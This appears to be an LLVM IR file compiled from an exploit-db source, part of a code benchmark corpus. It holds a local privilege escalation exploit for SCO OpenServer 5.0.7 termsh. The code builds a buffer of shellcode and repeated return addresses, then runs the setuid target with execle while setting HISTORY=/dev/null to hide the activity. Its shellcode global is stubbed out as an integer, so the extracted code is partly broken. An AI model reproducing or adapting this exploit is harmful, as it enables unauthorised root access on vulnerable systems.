; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_1402.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_1402.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [3 x i8] c"-o\00", align 1
@.str.1 = private unnamed_addr constant [18 x i8] c"HISTORY=/dev/null\00", align 1
@__const.main.env = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i32 0, i32 0), i8* null], align 16
@.str.2 = private unnamed_addr constant [66 x i8] c"[ SCO Openserver 5.0.7 termsh local privilege escalation exploit\0A\00", align 1
@.str.3 = private unnamed_addr constant [79 x i8] c"[ Error  : [path]\0A[ Example: %s /opt/K/SCO/Unix/5.0.7Hw/usr/lib/sysadm/termsh\0A\00", align 1
@shellcode = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [2 x i8*], align 16
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8** %7, align 8
  %12 = bitcast [2 x i8*]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 bitcast ([2 x i8*]* @__const.main.env to i8*), i64 16, i1 false)
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.2, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 2
  br i1 %15, label %16, label %22

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.3, i64 0, i64 0), i8* %19)
  %21 = call i32 @exit(i32 0) #4
  unreachable

22:                                               ; preds = %2
  store i64 2718435411, i64* %9, align 8
  %23 = load i32, i32* @shellcode, align 4
  %24 = call i64 @strlen(i32 %23)
  %25 = add nsw i64 7449, %24
  %26 = trunc i64 %25 to i32
  %27 = call i8* @malloc(i32 %26)
  store i8* %27, i8** %6, align 8
  %28 = load i8*, i8** %6, align 8
  %29 = load i32, i32* @shellcode, align 4
  %30 = call i64 @strlen(i32 %29)
  %31 = add nsw i64 7449, %30
  %32 = trunc i64 %31 to i32
  %33 = call i32 @memset(i8* %28, i8 signext 0, i32 %32)
  %34 = load i8*, i8** %6, align 8
  %35 = ptrtoint i8* %34 to i64
  %36 = load i32, i32* @shellcode, align 4
  %37 = call i64 @strlen(i32 %36)
  %38 = add nsw i64 %35, %37
  store i64 %38, i64* %10, align 8
  %39 = load i8*, i8** %6, align 8
  %40 = load i32, i32* @shellcode, align 4
  %41 = load i32, i32* @shellcode, align 4
  %42 = call i64 @strlen(i32 %41)
  %43 = call i32 @strncpy(i8* %39, i32 %40, i64 %42)
  store i32 1, i32* %11, align 4
  br label %44

44:                                               ; preds = %54, %22
  %45 = load i32, i32* %11, align 4
  %46 = icmp sle i32 %45, 1862
  br i1 %46, label %47, label %57

47:                                               ; preds = %44
  %48 = load i64, i64* %10, align 8
  %49 = inttoptr i64 %48 to i8*
  %50 = bitcast i64* %9 to i8*
  %51 = call i32 @memcpy(i8* %49, i8* %50, i32 4)
  %52 = load i64, i64* %10, align 8
  %53 = add nsw i64 %52, 4
  store i64 %53, i64* %10, align 8
  br label %54

54:                                               ; preds = %47
  %55 = load i32, i32* %11, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %11, align 4
  br label %44

57:                                               ; preds = %44
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 1
  %60 = load i8*, i8** %59, align 8
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 1
  %63 = load i8*, i8** %62, align 8
  %64 = load i8*, i8** %7, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = getelementptr inbounds [2 x i8*], [2 x i8*]* %8, i64 0, i64 0
  %67 = call i32 @execle(i8* %60, i8* %63, i8* %64, i8* %65, i32* null, i8** %66)
  %68 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i8* @malloc(i32) #2

declare dso_local i64 @strlen(i32) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @strncpy(i8*, i32, i64) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i32*, i8**) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
